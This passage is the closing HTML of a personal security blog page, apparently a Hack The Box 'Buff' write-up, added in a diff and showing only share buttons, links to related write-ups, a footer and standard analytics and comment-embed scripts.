+  <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+Write-up+%236+%3A+Buff%20https%3A%2F%2Fpi0x73.github.io%2FHackTheBox-Buff%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fpi0x73.github.io%2FHackTheBox-Buff%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fpi0x73.github.io%2FHackTheBox-Buff%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/HackTheBox-Tabby/" class="pagination--pager" title="Hack The Box Write-up #5 : Tabby
+">Previous</a>
+    
+    
+      <a href="/Bypassing-2FA-Security-Lawyer/" class="pagination--pager" title="Bypassing 2FA (two-factor authentication) through a MITM attack
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a comment</h4>
+      <section id="disqus_thread"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/2FA-Bypass/evilginx1.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/Bypassing-2FA-Security-Lawyer/" rel="permalink">Bypassing 2FA (two-factor authentication) through a MITM attack
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">A walkthrough demonstrating how secure 2FA is and how can it be bypassed.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/tabby-writeup/tabby.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/HackTheBox-Tabby/" rel="permalink">Hack The Box Write-up #5 : Tabby
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Writeup for Tabby, a machine provided by HacktheBox.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/blunder-writeup/blunder.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/HackTheBox-Blunder/" rel="permalink">Hack The Box Write-up #4 : Blunder
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Writeup for Blunder, a machine provided by HacktheBox.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/fword-ctf/fword.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/Fword-2020-OnePart/" rel="permalink">Fword 2020[OnePart! Writeup]
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Challenge Writeup
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+<script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="suljotgjoka" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. You can now buy me a coffee!" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 pi0x73's blog. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+  <script>
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'G-HCRGSEGD1K']);
+  
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "https://pi0x73.github.io/HackTheBox-Buff/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/HackTheBox-Buff"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://pi0x73.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+
+  </body>
+</html>
